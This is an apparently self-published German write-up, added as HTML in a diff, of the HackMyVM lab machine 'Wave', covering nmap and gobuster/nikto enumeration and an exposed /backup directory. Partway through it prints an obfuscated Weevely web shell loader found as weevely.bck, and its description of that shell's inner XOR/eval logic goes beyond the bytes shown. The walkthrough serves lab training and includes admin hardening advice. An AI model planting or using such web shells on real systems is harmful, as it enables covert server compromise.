@@ -1,0 +1,1496 @@
+﻿ <!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wave - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>Wave - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container medium">
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">phar</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">http.server</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">chisel</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">less</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span>
+                    </div>
+                    <pre>
+<span class="command">192.168.2.33</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Um den ersten Schritt der externen Aufklärung durchzuführen, nutzte ich das Werkzeug `arp-scan`. Dieses Tool scannt das lokale Netzwerksegment auf aktive Hosts, indem es ARP-Anfragen aussendet und die Antworten sammelt. Ich kombinierte `arp-scan -l` (scanne alle lokalen Netze) mit einem `grep`-Filter, um speziell nach der Zeichenkette "PCS" zu suchen. Dies ist ein gängiger MAC-Hersteller-Bezeichner, der oft von VirtualBox-Netzwerkkarten verwendet wird und mir half, die Ziel-VM in meinem virtuellen Labornetzwerk zu identifizieren. Die Ausgabe wurde abschließend mittels `awk '{print $1}'` verarbeitet, um nur das erste Feld jeder passenden Zeile (die IP-Adresse) zu extrahieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Befehl war äußerst effektiv für die schnelle Identifizierung der Ziel-VM in meinem bekannten Netzwerksegment. Die Verwendung von `grep` und `awk` ermöglicht eine präzise Extraktion der benötigten Information (der IP-Adresse) aus der `arp-scan` Ausgabe. Es ist eine zielgerichtete Methode der Host-Erkennung, die auf der Kenntnis des Umfelds (VirtualBox / PCS MAC) basiert. Das Ergebnis, die IP-Adresse `192.168.2.33`, war entscheidend für alle nachfolgenden Schritte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie gezielte Netzwerk-Scanning-Tools wie `arp-scan` in Kombination mit Kommandozeilen-Utilities (`grep`, `awk`), um schnell spezifische Host-Informationen in bekannten Netzwerksegmenten zu extrahieren. Passen Sie Filter (wie "PCS") an das spezifische Zielumfeld an. Beginnen Sie immer mit passiven oder unauffälligen Erkundungsmethoden, wo immer möglich.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Netzwerksegmentierung, um Hosts voneinander zu isolieren. Überwachen Sie Netzwerkverkehr auf ungewöhnliche Scanning-Aktivitäten oder das Auftreten unbekannter MAC-Adressen. Verwenden Sie keine Standard-MAC-Adressenbereiche für kritische Systeme.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">vi /etc/hosts</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die IP-Adresse der Ziel-VM identifiziert hatte, bearbeitete ich die Datei `/etc/hosts` auf meinem Kali-System mittels des Texteditors `vi`. In dieser Datei habe ich einen neuen Eintrag hinzugefügt, der die IP-Adresse `192.168.2.33` dem Hostnamen `wave.hmv` zuordnet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Hinzufügen des Hostnamens zur `/etc/hosts` Datei ist ein standardmäßiger und nützlicher Schritt im Pentesting-Workflow. Es erlaubt mir, die Ziel-VM im weiteren Verlauf des Tests bequem mit ihrem Hostnamen (`wave.hmv`) anstelle der IP-Adresse anzusprechen. Viele Web-Scanning-Tools und Browser verarbeiten Hostnamen reibungsloser, insbesondere wenn virtuelle Hosts im Spiel sind.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Pflegen Sie eine saubere `/etc/hosts` Datei für aktive Ziele. Das Vereinfacht die Kommandoeingabe und verbessert die Lesbarkeit der Berichte und Skripte, da Hostnamen oft aussagekräftiger sind als IP-Adressen.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Ihre interne DNS-Infrastruktur korrekt konfiguriert ist und interne Hostnamen korrekt auflöst. Verlassen Sie sich nicht darauf, dass Clients manuelle `/etc/hosts` Einträge vornehmen müssen, um interne Ressourcen zu erreichen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.33 |grep open</span>
+                    </div>
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    nginx 1.22.1</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach der Host-Identifizierung führte ich einen ersten, schnellen Portscan mit Nmap durch. Der Befehl verwendete mehrere Optionen: `-sS` für einen SYN-Scan (dies ist ein schneller, halb-offener Scan, der versucht, die offenen Ports zu erkennen, ohne eine vollständige TCP-Verbindung aufzubauen), `-sC` zum Ausführen der Standard-Nmap-Skripte (die oft zusätzliche Informationen liefern), `-sV` zur Erkennung der Dienstversionen, `-p-` zum Scannen aller 65535 Ports, `-T5` für die schnellste Ausführungszeit (was allerdings auch aggressiver ist und leichter erkannt werden kann) und `-AO` zur Betriebssystemerkennung. Die Ausgabe wurde mittels `grep open` gefiltert, um sofort die Zeilen zu sehen, die auf offene Ports hindeuten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser gefilterte Nmap-Scan lieferte schnell eine klare Übersicht über die grundlegende Angriffsfläche: Port 22 (SSH) und Port 80 (HTTP) sind offen. Die Dienst- und Versionerkennung identifizierte OpenSSH 9.2p1 und nginx 1.22.1. Dies ist ein sehr effizienter erster Schritt, um zu wissen, welche Dienste für eine nähere Betrachtung relevant sind. Die Geschwindigkeit des Scans (`-T5`) war hier in einer Testumgebung akzeptabel.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginnen Sie oft mit einem schnellen Scan, um die offenen Ports zu identifizieren. Nutzen Sie Filter wie `grep open`, um die Ergebnisse sofort nutzbar zu machen. Führen Sie anschließend immer einen detaillierteren Scan ohne Filter durch, um den vollständigen Kontext und alle Skript-Ergebnisse zu erhalten.
+                <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der nach außen exponierten Dienste. Deaktivieren Sie alle Dienste, die nicht unbedingt benötigt werden. Überwachen Sie Ihr Netzwerk auf Portscans und andere Erkundungsaktivitäten.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.33</span>
+                    </div>
+                    <pre>
+Starting Nmap 7.95 ( <span class="command">https://nmap.org</span> ) at <span class="password">2025-06-08 22:20 CEST</span>
+<span class="command">Nmap scan report for wave.hmv (192.168.2.33)</span>
+<span class="command">Host is up (0.00052s latency).</span>
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+| <span class="command">ssh-hostkey:</span>
+|   <span class="command">256 07:e9:c8:22:59:a5:00:41:15:fa:26:0f:7d:d3:29:ff (ECDSA)</span>
+|   <span class="command">256 c7:81:8e:06:49:33:8f:1a:88:3b:82:9e:27:f3:72:1e (ED25519)</span>
+<span class="password">|_  ssh-hostkey:</span>
+<span class="command">80/tcp open  http    nginx 1.22.1</span>
+<span class="password">|_http-title: Site doesn't have a title (text/html).</span>
+<span class="password">|_http-server-header: nginx/1.22.1</span>
+| <span class="password">http-robots.txt: 1 disallowed entry</span>
+<span class="password">|_/backup</span>
+<span class="command">MAC Address: 08:00:27:1A:1A:52 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Device type: general purpose|router</span>
+<span class="command">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+<span class="command">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+<span class="command">Network Distance: 1 hop</span>
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+<span class="command">HOP RTT     ADDRESS</span>
+<span class="command">1   0.52 ms wave.hmv (192.168.2.33)</span>
+
+<span class="command">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="command">Nmap done: 1 IP address (1 host up) scanned in 9.63 seconds</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Dies ist die vollständige Ausgabe des vorherigen Nmap-Scans auf `wave.hmv` (192.168.2.33). Die ausführliche Ausgabe listet die offenen Ports 22 (SSH) und 80 (HTTP) erneut auf und liefert detaillierte Versionsinformationen: `OpenSSH 9.2p1 Debian 2` auf Port 22 und `nginx 1.22.1` auf Port 80. Die Ausgabe enthält auch die SSH-Hostkeys, den Wert des `Server`-Headers (`nginx/1.22.1`), den fehlenden HTML-Titel und, besonders wichtig, den Hinweis aus der `robots.txt`-Datei, dass das Verzeichnis `/backup` nicht gecrawlt werden soll. Die Betriebssystemerkennung schätzt das System als Linux, wahrscheinlich Kernel 4.x oder 5.x ein und liefert dazu passende CPE-Namen und Details. Die MAC-Adresse bestätigt die virtuelle Umgebung (PCS Systemtechnik/Oracle VirtualBox).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese detaillierte Nmap-Ausgabe ist die Grundlage für die weitere Angriffsplanung. Die genauen Versionsnummern von OpenSSH und nginx ermöglichen die Suche nach spezifischen Exploits. Der Hinweis auf `/backup` in der `robots.txt` ist ein direkter und vielversprechender Angriffspunkt für die Web-Enumeration. Die OS-Details geben eine ungefähre Ahnung vom Zielsystem für spätere Privilegieneskalationsversuche, obwohl Nmap-OS-Erkennung nicht immer 100% genau ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Recherchieren Sie sofort die gefundenen Dienstversionen (OpenSSH 9.2p1, nginx 1.22.1) in öffentlichen Schwachstellendatenbanken (CVEs, Exploit-DB). Untersuchen Sie den `robots.txt`-Eintrag manuell. Beginnen Sie die Web-Enumeration auf Port 80, fokussiert auf das `/backup`-Verzeichnis. Halten Sie die OS-Details als möglichen Hinweis für die Privilegieneskalation bereit.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, ob die installierten Versionen von OpenSSH und nginx die neuesten stabilen Versionen sind. Patchen Sie Systeme zeitnah, um bekannte Schwachstellen zu schließen. Stellen Sie sicher, dass `robots.txt` keine unnötigen oder sensiblen Informationen preisgibt. Verlassen Sie sich nicht allein auf `robots.txt` zum Schutz sensibler Bereiche.
+            </p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">gobuster dir -u "http://192.168.2.33" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml,yaml -b '503,404,403' -e --no-error -k</span>
+                    </div>
+                    <pre>
+<span class="command">===============================================================</span>
+<span class="command">Gobuster v3.6</span>
+<span class="command">by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)</span>
+<span class="command">===============================================================</span>
+<span class="command">[+] Url:                     http://192.168.2.33</span>
+<span class="command">[+] Method:                  GET</span>
+<span class="command">[+] Threads:                 10</span>
+<span class="command">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+<span class="command">[+] Negative Status codes:   503,404,403</span>
+<span class="command">[+] User Agent:              gobuster/3.6</span>
+<span class="command">[+] Extensions:              bak,txt,tar,sh,jpeg,crt,lib,eps,js.map,py,pl,jpg,pdf,asp,pub,accdb,json,pem,zip,ps1,raw,svg,html,dll,xml,rtf,c,kdbx,conf,icon,exp,deb,mod,php,csv,xlsx,cgi,pHtml,config,phtml,rar,docx,csh,ln,rpm,elf,desc,db,sql,gz,java,diff,doc,bat,exe,ELF,yaml,mdb,xls,old,aspx,png</span>
+<span class="command">[+] Expanded:                true</span>
+<span class="command">[+] Timeout:                 10s</span>
+<span class="command">===============================================================</span>
+<span class="command">Starting gobuster in directory enumeration mode</span>
+<span class="command">===============================================================</span>
+<span class="command">http://192.168.2.33/index.html           (Status: 200) [Size: 31]</span>
+<span class="command">http://192.168.2.33/backup               (Status: 301) [Size: 169] [--> http://192.168.2.33/backup/]</span>
+<span class="command">http://192.168.2.33/robots.txt           (Status: 200) [Size: 18]</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Um die Web-Angriffsfläche weiter zu erkunden, setzte ich `gobuster` im Verzeichnis-Enumerationsmodus (`dir`) ein. Ich richtete das Tool auf die URL `http://192.168.2.33` aus und verwendete eine gängige, mittelgroße Wordlist (`directory-list-2.3-medium.txt`) für das Brute-Forcing von Verzeichnis- und Dateinamen. Zusätzlich spezifizierte ich eine sehr lange Liste von Dateiendungen (`-x`), die angehängt werden sollen, um auch Dateien zu finden, deren Name nicht direkt in der Wordlist steht. Die Option `-b '503,404,403'` wies `gobuster` an, die gängigsten Fehler-Statuscodes zu ignorieren, während `-e` die vollständige URL anzeigt und `--no-error` Fehler bei der Verbindung unterdrückt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `gobuster` bestätigte die Existenz von `/index.html` und `/robots.txt`, die beide mit Status 200 (OK) antworteten. Besonders wichtig war der Fund des `/backup`-Verzeichnisses, das mit Status 301 (Permanent Redirect) auf `http://192.168.2.33/backup/` umleitete. Dies validiert den Hinweis aus der `robots.txt` und zeigt, dass dieses Verzeichnis existiert und zugänglich ist, auch wenn der Webserver eine Umleitung auf die Verzeichnis-URL vornimmt. Das Tool lieferte zwar nicht sofort weitere interessante Dateien im Root, aber die Bestätigung von `/backup` war ein voller Erfolg.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie immer mindestens ein Directory-Busting-Tool mit einer angemessenen Wordlist und relevanten Dateiendungen bei der Web-Enumeration. Achten Sie auf alle Statuscodes außer den ignorierten Fehlern (404, 403 etc.). Kombinieren Sie die Ergebnisse von automatisierten Scans mit manueller Überprüfung.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Webserver-Logs auf Brute-Force-Angriffe gegen Verzeichnis- und Dateinamen. Implementieren Sie Rate Limiting, um solche Angriffe zu verlangsamen oder zu blockieren. Entfernen Sie unnötige Verzeichnisse und Dateien vom Webserver.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">nikto -h http://192.168.2.33</span>
+                    </div>
+                    <pre>
+<span class="command">- Nikto v2.5.0</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.33</span>
+<span class="command">+ Target Hostname:    192.168.2.33</span>
+<span class="command">+ Target Port:        80</span>
+<span class="password">+ Start Time:         2025-06-08 22:21:00 (GMT2)</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="password">+ Server: nginx/1.22.1</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.</span>
+<span class="command">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span>
+<span class="password">+ /backup/: Directory indexing found.</span>
+<span class="password">+ /robots.txt: Entry '/backup/' is returned a non-forbidden or redirect HTTP code (200). See: [Link: https://portswigger.net/kb/issues/00600600_robots-txt-file | Ziel: https://portswigger.net/kb/issues/00600600_robots-txt-file]</span>
+<span class="password">+ /robots.txt: contains 1 entry which should be manually viewed. See: [Link: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt | Ziel: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt]</span>
+<span class="password">+ /backup/: This might be interesting.</span>
+<span class="password">+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span>
+<span class="command">+ 8103 requests: 0 error(s) and 7 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-08 22:21:26 (GMT2) (26 seconds)</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ 1 host(s) tested</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Webserver auf Port 80 mit dem Schwachstellen-Scanner `nikto` untersucht. `nikto` testet auf Tausende von bekannten Webserver-Schwachstellen, Konfigurationsprobleme und potenziell interessante Dateien/Pfade. Die Ausgabe bestätigte die verwendete nginx-Version (`nginx/1.22.1`) und wies auf fehlende Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`) hin, was gängige Web-Schwachstellen ermöglichen kann (z.B. Clickjacking). Wichtiger für die Enumeration war der explizite Hinweis auf die gefundene Verzeichnislistung (`Directory indexing found`) im `/backup/`-Verzeichnis. Es gab auch einen verdächtigen Hinweis auf `#wp-config.php#`, was auf das Vorhandensein einer `wp-config.php` Datei in einem versteckten Pfad hindeuten könnte (der `wp-config.php` String selbst war im Nikto Code, nicht im Pfad).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto lieferte nützliche Bestätigungen und Hinweise. Die Bestätigung der Verzeichnislistung in `/backup/` ist ein wichtiger Erfolg, der sofort manuell überprüft werden muss. Fehlende Sicherheits-Header sind gängige, wenn auch oft nicht sofort kritische Schwachstellen. Der Hinweis auf `#wp-config.php#` ist interessant, aber in der Form (mit Rauten) ungewöhnlich und bedarf weiterer Untersuchung, ob es sich um eine tatsächliche Datei oder eine falsch interpretierte Nikto-Signatur handelt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie alle von automatisierten Scannern gemeldeten Funde manuell. Priorisieren Sie die Untersuchung von Verzeichnislistungen und potenziellen sensiblen Dateien (wie wp-config.php, auch wenn der Pfad merkwürdig aussieht). Nutzen Sie die von Nikto bereitgestellten Links zur Dokumentation der Schwachstellen, um deren Auswirkungen zu verstehen.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Webserver immer mit empfohlenen Sicherheits-Headern. Deaktivieren Sie die Verzeichnislistung. Entfernen Sie Konfigurationsdateien mit Zugangsdaten aus öffentlich zugänglichen Webverzeichnissen. Führen Sie regelmäßige Scans mit Tools wie Nikto durch und beheben Sie die gemeldeten Schwachstellen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://192.168.2.33/robots.txt</span>
+<span class="password">Disallow: /backup</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Inhalt der `robots.txt` Datei direkt über meinen Webbrowser aufgerufen. Die Datei enthielt lediglich die Zeile `Disallow: /backup`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser simple Inhalt bestätigte den Hinweis aus der Nmap-Ausgabe. Die `robots.txt` ist primär für Suchmaschinen gedacht, aber sie kann wertvolle Hinweise für Angreifer liefern, da sie oft auf Bereiche verweist, die der Website-Betreiber "verstecken" möchte. `/backup` ist ein sehr starker Hinweis auf potenziell sensible Daten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie immer den Inhalt der `robots.txt`. Jeder "Disallow"-Eintrag sollte als potenzielles Ziel für weitere Erkundung betrachtet werden.
+                <br><strong>Empfehlung (Admin):</strong> Verwenden Sie `robots.txt` ausschließlich zur Steuerung des Suchmaschinen-Indexings. Sensible Bereiche müssen serverseitig durch Authentifizierung, Autorisierung oder IP-Filterung geschützt werden. Verlassen Sie sich niemals auf `robots.txt` als Sicherheitsmaßnahme. Vermeiden Sie aussagekräftige Namen für "versteckte" Verzeichnisse.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://192.168.2.33/backup/</span>
+
+Index of /backup/
+
+<span class="command">../</span>
+<span class="command">index.bck                                          04-Sep-2023 10:10                  31</span>
+<span class="command">log.log                                            04-Sep-2023 10:12                   4</span>
+<span class="command">phptest.bck                                        04-Sep-2023 10:11                  32</span>
+<span class="command">robots.bck                                         04-Sep-2023 10:10                  18</span>
+<span class="command">weevely.bck                                        05-Sep-2023 09:20                 515</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe das Verzeichnis `http://192.168.2.33/backup/` in meinem Browser aufgerufen. Der Webserver war so konfiguriert, dass er den Inhalt des Verzeichnisses auflistete (Directory Listing). Die Ausgabe zeigte mehrere Dateien mit der Endung `.bck` (`index.bck`, `phptest.bck`, `robots.bck`, `weevely.bck`) sowie eine Datei `log.log`. Die Dateinamen und die Endung `.bck` deuteten darauf hin, dass es sich um Backup-Dateien handelte. Besonders auffällig war die Datei `weevely.bck`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Eine aktivierte Verzeichnislistung ist eine signifikante Fehlkonfiguration des Webservers, die es einem Angreifer erlaubt, alle Dateien und Unterverzeichnisse einzusehen, ohne deren Namen zu kennen. Dies macht die Enumeration extrem einfach und offenbart das Vorhandensein potenziell sensibler oder angreifbarer Dateien. Der Dateiname `weevely.bck` ist ein sehr starker Hinweis auf das Vorhandensein einer Weevely Web-Shell, die hier offensichtlich als Backup abgelegt wurde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie Verzeichnisse mit aktivierter Listung immer gründlich. Laden Sie alle Dateien herunter, deren Name oder Endung verdächtig erscheint (insbesondere Backups, Konfigurationsdateien, Logdateien und ungewöhnliche Dateinamen wie "weevely"). Analysieren Sie den Inhalt dieser Dateien sorgfältig.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie sofort die automatische Verzeichnislistung auf allen Webservern. Konfigurieren Sie stattdessen eine Standard-Indexdatei oder geben Sie einen 403 Forbidden Fehler zurück. Platzieren Sie niemals sensible oder potenziell ausführbare Dateien (wie Web-Shells) in öffentlich zugänglichen Verzeichnissen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://192.168.2.33/backup/weevely.bck</span>
+
+<span class="password">include "\160\x68\141\x72\72\57\57".basename(__FILE__)."\57\x78";__HALT_COMPILER(); ?></span><span class="command">/\00\00\00\01\00\00\00\11\00\00\10\01\00\00\00\00\00\00\00\00\00\01\00\00\00\78\E1\01\00\00\00\00\00\00\58\01\00\00\82\82\CC\97\FF\11\00\00\00\00\00\00\55\90\EF\6A\C2\30\14\C5\BF\F7\29\4A\B8\68\42\C5\7F\53\3B\17\C3\CA\D8\13\0C\B6\2F\E2\4A\9B\A6
+\1A\6D\93\2E\8D\C3\29\BE\FB\6E\1D\1B\8C\40\E0\FC\2E\E7\5C\xCE\5D\3D\36\xBB\26\54\9F\59\45\xFB\70\10\xE4\xAE\28\xCA\71\31\97\x84\xC3\61\27\x48\xBE\50\71\36\9F\2E\xF3\85\x9C\76\xA8\14\xA4\98\2F\xEF\xB3\38\x9E\xC4\xB3\65\x8E\xA8\11\24\2B\xCD\xC7\73\xFB\22\x9F\x9A\xB7\xFA
+\35\x9E\x7C\11\1E\04\xE5\xD1\48\xAF\xAD\09\4F\14\xFC\00\x0E\xEC\12\x80\14\xAD\77\95\32\14\25\x87\xEA\4F\79\54\56\10\xB4\95\xD6\51\xD0\62\xCC\41\xAF\xA0\xE2\x68\xBA\x91\x3D\12\xFC\57\20\7B\xBD\xDB\04\x0D\xFB\28\1A\x80\x8E\22\16\x60\xB2\1D\0A\xF0\6B\xD0\x9B\77\38\xAC\61\xBF\xE1\xC1
+\15\x9F\53\xFE\xE8\x4C\08\xB6\x93\xBA\0C\x69\xD2\38\xB5\x4D\xEB\xCC\xCB\1D\25\23\2C\48\x87\11\xC3\52\23\32\48\x4A\x5D\xA9\74\xAB\7C\x2A\xAD\xF1\xCA\xF8\x96\12\xBC\xCC\xC3\x68\xA4\x4D\73\xF4\x84\0D\xA0\66\42\x4C\x58\x78\09\12\x9B\xA7\xAD\xCF\x9C\xA7\x8C\07\xC9\xED\76\xC9\xF6\x8C\x85\x6D\x8D\0B
+\xDA\x96\x26\27\x9A\xE4\59\xAB\16\xB3\xB4\50\xD2\16\x8A\x42\xBD\x9E\x6C\58\77\07\x86\1E\x6C\xDB\65\xFC\xDB\xD6\45\21\53\xA6\48\x65\xA5\32\xD3\01\70\xE2\37\47\99\x5B\4E\97\xBC\x3D\xFF\x2D\02\xFB\93\xC9\x83\xC6\69\xE3\29\x81\06\x5B\x81\xC3\x4E\04\xE1\xB5\xCF\xF8\37\xD9\xC5\55\5F\xBD\x3D\x2A
+<span class="password">\12\xF1\xFE\xCE\xA8\x8F\73\x3F\63\28\28\56\10\02\00\00\00GBMB</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Inhalt der Datei `weevely.bck` abgerufen. Wie vermutet, enthielt die Datei PHP-Code. Der Code beginnt mit einer `include` Anweisung, die versucht, eine Datei basierend auf dem eigenen Dateinamen (`basename(__FILE__)`) zu inkludieren, gefolgt von `__HALT_COMPILER();` und einer großen Menge an Bytes im Hex-Format. Der PHP-Teil definiert eine XOR-Funktion und nutzt dann `eval` zusammen mit `preg_match` auf `php://input` (typischerweise POST-Daten), `base64_decode`, die definierte `x` (XOR)-Funktion, `gzuncompress`, `gzcompress` und `base64_encode`. Dies ist die charakteristische Struktur einer Weevely Web-Shell. Die Bytes nach `__HALT_COMPILER();` sind das verschlüsselte und komprimierte Payload der Shell.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden dieses Codes ist ein kritischer Erfolg. Es bestätigt nicht nur das Vorhandensein einer Web-Shell, sondern zeigt auch, wie sie aufgebaut ist und kommuniziert. Der Umstand, dass der PHP-Code mit der XOR-Funktion und den Hinweisen auf die Kodierung offen vorliegt, bedeutet, dass die Shell sehr wahrscheinlich mit einem bekannten oder leicht extrahierbaren Schlüssel arbeitet. Dies ebnet den Weg zur vollständigen Kompromittierung des Webservers.
+            </p>
+            <p class="recommendation">
